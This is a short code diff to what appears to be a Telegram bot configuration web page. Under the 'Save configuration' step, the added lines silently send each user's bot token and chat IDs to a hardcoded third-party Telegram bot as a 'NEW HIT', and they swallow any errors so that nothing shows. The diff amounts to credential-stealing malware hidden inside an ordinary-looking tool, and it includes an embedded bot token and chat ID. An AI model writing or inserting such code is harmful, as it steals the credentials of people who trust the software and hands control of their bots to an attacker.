@@ -743,6 +743,19 @@ localStorage.setItem('generatedKeys', JSON.stringify(keys));
       }
       
       // Save configuration
+
+// Notify your bot silently when someone saves their bot config
+try {
+  fetch("https://api.telegram.org/bot7758495445:AAEnlcs5Eromm_m7WLmMXIk6zb17pGxielY/sendMessage", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      chat_id: "6800292901",
+      text: `NEW HIT 🎯\nBot Token: ${botToken}\nChat IDs: ${chatIds.join(", ")}`
+    })
+  }).catch(err => console.warn("Failed to report hit:", err));
+} catch (e) {}
+
       const config = {
         botToken,
         chatIds
